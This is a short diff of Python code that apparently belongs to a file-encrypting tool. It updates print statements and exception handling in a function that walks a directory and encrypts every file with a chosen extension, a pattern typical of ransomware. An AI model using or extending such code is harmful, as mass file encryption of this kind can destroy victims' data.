@@ -30,9 +30,10 @@ def enc_files(dir_):
 			if len(splitted)>=2:
 				if splitted[len(splitted)-1] in extensions:
 					file_=os.path.join(dir_, f)
-					print "Encrypting",file_,"..."
+					print ("Encrypting "+file_+"...")
 					encrypt_(file_)
-	except:
+	except ValueError as e:
+		print (e.text)
 		pass
 
 def loop(looped_dir):
